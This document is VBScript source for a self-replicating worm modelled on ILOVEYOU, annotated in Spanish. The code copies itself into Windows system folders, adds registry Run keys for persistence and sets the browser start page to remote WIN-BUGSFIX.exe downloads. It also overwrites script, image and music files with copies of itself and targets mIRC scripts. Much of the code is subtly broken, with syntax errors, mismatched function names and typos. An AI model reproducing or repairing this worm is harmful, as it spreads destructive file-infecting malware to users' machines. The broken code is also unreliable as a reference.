On Error Resume Next

Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow

eq = ""
ctr = ""

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript, ScriptFullname, 1)

vbscopy = file.ReadAll

main()

Sub main()
    On Error Resume Next

    Dim wscr, rr

    Set wscr = CreateObject("WScript.Shell")

    rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")

    If (rr >= 1) Then
        wscr.RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD")
    
    End If

    Set dirwin = fso.GetSpecialFolder(0)
    Set dirsystem = fso.GetSpecialFolder(1)
    Set dirtemp = fso.GetSpecialFolder(2)
    Set c = fso.GetFile(WScript, ScriptFullName)

    c.Copy(dirsystem & "\MSKernel32.vbs")
    c.Copy(dirwin & "\Win32DLL.vbs")
    c.Copy(dirsystem & "\Kasper.vbs")

    ActivarRegistros()
    listadriv()

End Sub

Sub ActivarRegistros()
    On Error Resume Next

    Dim num, downread

    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"

    downread = ""
    downread = ObtenerRegistro("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")

    If(downread = "") Then
        downread = "C:\"
    End If

    If (ExisteArchivo(dirsystem & "\WinFAT32.exe") = 1) Then
        Randomize

        num = Int((4 * Rnd) + 1)

        If num = 1 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
        ElseIf num = 2 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
        ElseIf num = 3 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
        ElseIf num = 4 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
        End If
    End If

    If (ExisteArchivo(downread) & "\WIN-BUGSFIX.exe") = 0) Then
        regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
    End If
End Sub

Sub listadriv()
    On Error Resume Next
    
    Dim d, dc, s

  Set dc = fso.Drives

  For Each d In dc
    If (d.DriveType = 2) Or (d.DriveType = 3) Then
      ListaCarpeta(d.path & "\")
    End If
  Next

  listadriv = s
  
End Sub

Sub InfectarArchivos(folderspec)
  On Error Resume Next

  Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3

  Set f = fso.GetFolder(folderspec)
  Set fc = f.Files

  For Each f1 In fc

    ext = fso.GetExtensionName(f1.path)

    ext = lcase(ext)

    s = lcase(f1.name)

    If (ext = "vbs") Or (ext = "vbe") Then
        Set ap = fso.OpenTextFile(f1.path, 2, true)

        ap.write vbscopy
        ap.close

    Else If (ext = "js")
        Or (ext = "jse")
        Or (ext = "css")
        Or (ext = "wsh")
        Or (ext = "sct")
        Or (ext = "hta")
    Then
        Set ap = fdo.OpenTextFile(f1.path, 2, true)

        ap.write vbscopy
        ap.close
        bname = fso.GetBaseName(f1.path)

        Set cop = fso.GetFile(f1.path)

        cop.copy(folderspec & "\" & bname & ".vbs")
        fso.DeleteFile(f1.path)

        'Se copia asi mismo dentro de las extensiones .jpeg o archivos de imagenes'
        'Aparte de eso crea una copia del archivo .vbs'

        Else If (ext = "jpg") Or (ext = "jpeg") Then

            'Se copia así mismo'

            Set ap = fso.OpenTextFile(f1.path, 2, true)

            ap.write vbscopy
            ap.close

            Set cop = fso.GetFile(f1.path)

            cop.copy(f1.path & ".vbs")
            fso.DeleteFile(f1.path)

        Else If (ext = "mp3") Or (ext = "mp2") Then

            Set mp3 = fso.CreateTextFile(f1.path & ".vbs")

            mp3.write vbscopy
            mp3.close

            Set att = fso.GetFile(f1.path)

            att.attributes = att.attributes + 2
    End If

    'Este malware revisará si la carpeta ya ha sido infectada, si no, continuará con el ataque infectando archivos'
    If (eq <> folderspec) Then

        'Deberia de crear o reemplazar script.ini con scripts maliciosos. 

        If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp") Then

            Set scriptini = fso.CreateTextFile(folderspec & "\script.ini") 
        
        End If
    End If
End Sub

'Una subroutine usada para obtener la lista de Archivos de una carpeta del S.O'

Sub ListaCarpeta(folderspec)
    On Error Resume Next

    Dim f, f1, sf

    Set f = fso.GetFolder(folderspec)
    Set fs = f.SubFolders

    'Repite cada subcarpeta de la carpeta de nivel superior dada e infecta archivos de forma recursiva'
    For Each f1 In sf
        InfectarArchivos(f1.path)
        ListaCarpeta(f1.path)
    Next
End Sub

'Funcion utilizada para crear / escribir entradas de registro'

Sub CrearRegistro(regkey, regvalue)

    Set regedit = CreateObject("WScript.Shell")
    regedit.RegWrite regkey, regvalue

End Sub

'Funcion utilizada para obtener entradas de registro'

Function ObtenerRegistro(valor)

    Set regedit = CreateObject("WScript.Shell")
    ObtenerRegistro = regedit.RegRead(valor)

End Function 

'Funcion para ver si el archivo SI existe'

Function ExisteArchivo(filespec)

    On Error Resume Next

    dim mensaje

    If (fso.ExisteArchivo(filespec)) Then
        mensaje = 0
    Else
        mensaje = 1
    End If

    ExisteArchivo = mensaje

End Function